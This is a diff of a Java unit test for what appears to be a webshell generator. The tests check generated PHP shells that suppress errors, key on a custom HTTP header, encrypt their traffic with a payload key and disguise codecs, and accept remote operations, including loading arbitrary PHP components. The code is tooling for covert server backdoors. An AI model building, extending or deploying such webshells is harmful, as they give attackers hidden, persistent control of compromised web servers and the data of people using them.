@@ -7,7 +7,7 @@ import org.leo.core.entity.Disguise;
 import org.leo.core.generator.GeneratedArtifact;
 import org.leo.core.generator.GenerationRequest;
 import org.leo.core.runtime.PuppetRuntime;
-import org.leo.core.util.json.PortableJsonCodec;
+import org.leo.phpcore.payload.PhpPayloadCodec;
 
 import java.io.ByteArrayOutputStream;
 import java.nio.charset.StandardCharsets;
@@ -29,6 +29,7 @@ import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 class PhpScriptGeneratorProviderTest {
+    private static final String PAYLOAD_KEY = "php-generator-test-key";
 
     @Test
     void generatesCompatibleMinifiedCompactSourceWithRandomizedCore() throws Exception {
@@ -42,7 +43,7 @@ class PhpScriptGeneratorProviderTest {
 
         String source = artifact.getContent();
         assertEquals("php", artifact.getFileExtension());
-        assertEquals(2, ((Number) artifact.getMetadata().get("protocolVersion")).intValue());
+        assertEquals(3, ((Number) artifact.getMetadata().get("protocolVersion")).intValue());
         assertEquals("Envelope", artifact.getMetadata().get("coreProtocol"));
         assertEquals("compact", artifact.getMetadata().get("outputMode"));
         assertEquals("minified-php", artifact.getMetadata().get("bootstrapEncoding"));
@@ -53,7 +54,8 @@ class PhpScriptGeneratorProviderTest {
         assertFalse(source.contains("eval("));
         assertTrue(source.contains("http_response_code(202);"));
         assertTrue(source.contains("$_SERVER['HTTP_X_LEO']"));
-        assertTrue(source.contains("function leo_request_decode($body)"));
+        assertTrue(source.contains("function leo_traffic_decode($body)"));
+        assertTrue(source.contains("leo_payload_decode"));
         assertTrue(source.contains("@error_reporting(0);"));
         assertTrue(source.contains("['componentKey']"));
         assertTrue(source.contains("'PING'"));
@@ -100,10 +102,10 @@ class PhpScriptGeneratorProviderTest {
                 ((Map<?, ?>) componentRequirements.get("ScanComponent")).get("functions"));
         assertEquals(List.of(), artifact.getMetadata().get("bundledComponents"));
         Map<?, ?> requirements = (Map<?, ?>) artifact.getMetadata().get("requirements");
-        assertFalse(requirements.containsKey("extensions"));
-        assertFalse(requirements.containsKey("functions"));
+        assertTrue(((List<?>) requirements.get("extensions")).containsAll(List.of("openssl", "zlib")));
+        assertTrue(((List<?>) requirements.get("functions")).containsAll(List.of("openssl_encrypt", "gzdecode")));
         assertTrue(source.length() < portable.getContent().length());
-        assertTrue(source.length() < 9_000,
+        assertTrue(source.length() < 16_000,
                 "minimal compact bootstrap regressed in size: " + source.length());
     }
 
@@ -122,7 +124,7 @@ class PhpScriptGeneratorProviderTest {
         Map<?, ?> requirements = (Map<?, ?>) artifact.getMetadata().get("requirements");
         assertTrue(((List<?>) requirements.get("extensions")).contains("zlib"));
         assertTrue(((List<?>) requirements.get("functions")).contains("gzinflate"));
-        assertTrue(artifact.getContent().length() < 4_000, "minimal packed bootstrap regressed in size");
+        assertTrue(artifact.getContent().length() < 8_000, "minimal packed bootstrap regressed in size");
     }
 
     @Test
@@ -149,7 +151,7 @@ class PhpScriptGeneratorProviderTest {
         assertEquals("7.1", requirements.get("minVersion"));
         assertTrue(((List<?>) requirements.get("extensions")).containsAll(List.of("json", "openssl")));
         assertTrue(((List<?>) requirements.get("functions")).contains("openssl_encrypt"));
-        assertFalse(((List<?>) requirements.get("extensions")).contains("zlib"));
+        assertTrue(((List<?>) requirements.get("extensions")).contains("zlib"));
     }
 
     @Test
@@ -171,20 +173,21 @@ class PhpScriptGeneratorProviderTest {
         GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
                 Map.of("outputMode", "portable", "seed", "envelope-ping"));
         String source = artifact.getContent().replace(
-                "file_get_contents('php://input')", "$argv[1]");
+                "file_get_contents('php://input')", "base64_decode($argv[1], true)");
         Path script = tempDir.resolve("envelope.php");
         Files.writeString(script, source, StandardCharsets.UTF_8);
         Map<String, Object> request = Map.of(
                 "requestId", "request-php-1",
                 "operation", "PING",
                 "params", Map.of());
-        String wire = Base64.getEncoder().encodeToString(PortableJsonCodec.encode(request));
+        String wire = Base64.getEncoder().encodeToString(
+                Base64.getEncoder().encode(new PhpPayloadCodec(PAYLOAD_KEY).encode(request)));
 
         Process process = new ProcessBuilder("php", script.toString(), wire)
                 .redirectErrorStream(true).start();
         byte[] output = process.getInputStream().readAllBytes();
         assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));
-        Map<String, Object> response = PortableJsonCodec.decode(
+        Map<String, Object> response = new PhpPayloadCodec(PAYLOAD_KEY).decode(
                 Base64.getDecoder().decode(new String(output, StandardCharsets.UTF_8).trim()));
 
         assertEquals("request-php-1", response.get("requestId"));
@@ -201,7 +204,7 @@ class PhpScriptGeneratorProviderTest {
                 Map.of("outputMode", "portable", "seed", "host-mismatch"));
         Path script = tempDir.resolve("host-mismatch.php");
         Files.writeString(script, artifact.getContent().replace(
-                "file_get_contents('php://input')", "$argv[1]"), StandardCharsets.UTF_8);
+                "file_get_contents('php://input')", "base64_decode($argv[1], true)"), StandardCharsets.UTF_8);
         Map<String, Object> request = Map.of(
                 "requestId", "request-wrong-host",
                 "operation", "COMPONENT_INVOKE",
@@ -209,13 +212,14 @@ class PhpScriptGeneratorProviderTest {
                 "component", "MissingComponent",
                 "action", "run",
                 "params", Map.of());
-        String wire = Base64.getEncoder().encodeToString(PortableJsonCodec.encode(request));
+        String wire = Base64.getEncoder().encodeToString(
+                Base64.getEncoder().encode(new PhpPayloadCodec(PAYLOAD_KEY).encode(request)));
 
         Process process = new ProcessBuilder("php", script.toString(), wire)
                 .redirectErrorStream(true).start();
         byte[] output = process.getInputStream().readAllBytes();
         assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));
-        Map<String, Object> response = PortableJsonCodec.decode(
+        Map<String, Object> response = new PhpPayloadCodec(PAYLOAD_KEY).decode(
                 Base64.getDecoder().decode(new String(output, StandardCharsets.UTF_8).trim()));
 
         assertEquals(409, ((Number) response.get("code")).intValue());
@@ -233,7 +237,7 @@ class PhpScriptGeneratorProviderTest {
                 Map.of("outputMode", "portable", "seed", "opaque-cache-layout"));
         Path script = tempDir.resolve("endpoint.php");
         Files.writeString(script, artifact.getContent().replace(
-                "file_get_contents('php://input')", "$argv[1]"), StandardCharsets.UTF_8);
+                "file_get_contents('php://input')", "base64_decode($argv[1], true)"), StandardCharsets.UTF_8);
         String componentKey = "a".repeat(80);
         String componentSource = "<?php return ['id'=>'FixtureComponent','version'=>'1.0.0',"
                 + "'handle'=>function($action,$params){return ['code'=>200];}];";
@@ -242,13 +246,14 @@ class PhpScriptGeneratorProviderTest {
                 "operation", "COMPONENT_LOAD",
                 "component", "FixtureComponent",
                 "params", Map.of("componentKey", componentKey, "source", componentSource));
-        String wire = Base64.getEncoder().encodeToString(PortableJsonCodec.encode(request));
+        String wire = Base64.getEncoder().encodeToString(
+                Base64.getEncoder().encode(new PhpPayloadCodec(PAYLOAD_KEY).encode(request)));
 
         Process process = new ProcessBuilder("php", "-d", "sys_temp_dir=" + tempDir,
                 script.toString(), wire).redirectErrorStream(true).start();
         byte[] output = process.getInputStream().readAllBytes();
         assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));
-        Map<String, Object> response = PortableJsonCodec.decode(
+        Map<String, Object> response = new PhpPayloadCodec(PAYLOAD_KEY).decode(
                 Base64.getDecoder().decode(new String(output, StandardCharsets.UTF_8).trim()));
         assertEquals(200, ((Number) response.get("code")).intValue());
 
@@ -271,7 +276,7 @@ class PhpScriptGeneratorProviderTest {
         PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
         GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
                 Map.of("outputMode", "portable", "seed", "bounded-cache"));
-        String source = artifact.getContent().replace("file_get_contents('php://input')", "$argv[1]");
+        String source = artifact.getContent().replace("file_get_contents('php://input')", "base64_decode($argv[1], true)");
         Matcher directoryMatcher = Pattern.compile("\\.([a-f0-9]{14})").matcher(source);
         Matcher suffixMatcher = Pattern.compile("\\*\\.([a-z]{3,5})").matcher(source);
         assertTrue(directoryMatcher.find());
@@ -291,7 +296,8 @@ class PhpScriptGeneratorProviderTest {
         Files.writeString(script, source, StandardCharsets.UTF_8);
         Map<String, Object> request = Map.of("requestId", "request-cache-sweep",
                 "operation", "PING", "params", Map.of());
-        String wire = Base64.getEncoder().encodeToString(PortableJsonCodec.encode(request));
+        String wire = Base64.getEncoder().encodeToString(
+                Base64.getEncoder().encode(new PhpPayloadCodec(PAYLOAD_KEY).encode(request)));
         Process process = new ProcessBuilder("php", "-d", "sys_temp_dir=" + tempDir,
                 script.toString(), wire).redirectErrorStream(true).start();
         byte[] output = process.getInputStream().readAllBytes();
@@ -306,12 +312,12 @@ class PhpScriptGeneratorProviderTest {
     @Test
     void rejectsUnsupportedOrNonPhpDisguises() {
         Disguise unsupported = disguise("unsupported");
-        unsupported.setProtocolVersion(1);
+        unsupported.setProtocolVersion(2);
         PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
         assertThrows(IllegalArgumentException.class, () -> generate(provider, unsupported, disguise("response"), Map.of()));
 
         Disguise incomplete = disguise("incomplete");
-        incomplete.setPhpEncodeBody(null);
+        incomplete.setPhpTrafficEncodeBody(null);
         assertThrows(IllegalArgumentException.class,
                 () -> generate(provider, incomplete, disguise("response"), Map.of()));
         assertThrows(IllegalArgumentException.class, () -> generate(provider, disguise("request"),
@@ -322,19 +328,21 @@ class PhpScriptGeneratorProviderTest {
 
     private GeneratedArtifact generate(PhpScriptGeneratorProvider provider, Disguise request,
                                        Disguise response, Map<String, Object> options) throws Exception {
-        return provider.generate(new GenerationRequest(PuppetRuntime.PHP, "webshell", request, response, options));
+        Map<String, Object> effective = new java.util.LinkedHashMap<>(options);
+        effective.putIfAbsent("payloadKey", "php-generator-test-key");
+        return provider.generate(new GenerationRequest(PuppetRuntime.PHP, "webshell", request, response, effective));
     }
 
     private Disguise disguise(String id) {
         Disguise disguise = new Disguise();
         disguise.setDisguiseId(id);
-        disguise.setSchemaVersion(2);
-        disguise.setProtocolVersion(2);
+        disguise.setSchemaVersion(3);
+        disguise.setProtocolVersion(3);
         disguise.setSupportedRuntimes(Set.of("php"));
-        disguise.setEncodeBody("java encode");
-        disguise.setDecodeBody("java decode");
-        disguise.setPhpEncodeBody("return base64_encode(json_encode(leo_wire_encode($payload))); ");
-        disguise.setPhpDecodeBody("return leo_wire_decode(json_decode(base64_decode($body), true));");
+        disguise.setTrafficEncodeBody("public byte[] encodeTraffic(byte[] data){return java.util.Base64.getEncoder().encode(data);}");
+        disguise.setTrafficDecodeBody("public byte[] decodeTraffic(byte[] data){return java.util.Base64.getDecoder().decode(data);}");
+        disguise.setPhpTrafficEncodeBody("return base64_encode($payload);");
+        disguise.setPhpTrafficDecodeBody("$decoded = base64_decode($body, true); if ($decoded === false) throw new InvalidArgumentException('bad traffic'); return $decoded;");
         return disguise;
     }
 
